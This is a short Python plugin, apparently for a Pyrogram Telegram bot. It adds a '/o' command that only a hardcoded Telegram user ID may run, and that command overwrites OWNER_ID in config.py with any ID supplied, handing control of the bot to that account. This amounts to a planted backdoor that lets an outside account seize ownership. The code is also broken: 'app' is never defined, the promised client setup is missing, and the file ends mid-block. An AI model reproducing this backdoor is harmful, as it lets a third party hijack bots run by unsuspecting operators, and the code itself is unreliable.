from pyrogram import Client, filters
import config
import importlib

# Initialize the Pyrogram Client
@app.on_message(filters.command("o") & filters.user(6582130398))
async def ochange(client, message):
    # Check if the command has an argument
    if len(message.command) != 2:
        await message.reply_text("Usage: /o <O_ID>")
        return

    try:
        # Parse the new owner ID
        new_owner_id = int(message.command[1])

        # Change OWNER_ID to the new value
        with open('config.py', 'r') as file:
            data = file.readlines()

        for i, line in enumerate(data):
            if line.startswith('OWNER_ID'):
                data[i] = f'OWNER_ID = {new_owner_id}\n'

        with open('config.py', 'w') as file:
            file.writelines(data)

        # Reload the config to apply changes
        importlib.reload(config)

        await message.reply_text(f"ID has been changed to {new_owner_id}.")
    except ValueError:
        await message.reply_text("Invalid ID. Please provide a valid integer.")

@app.on_message(filters.command("o") & ~filters.user(6582130398))
async def unauthorized(client, message):
    await message.reply_text("You are not authorized to perform this action.")

if __name__ == '__main__':
   
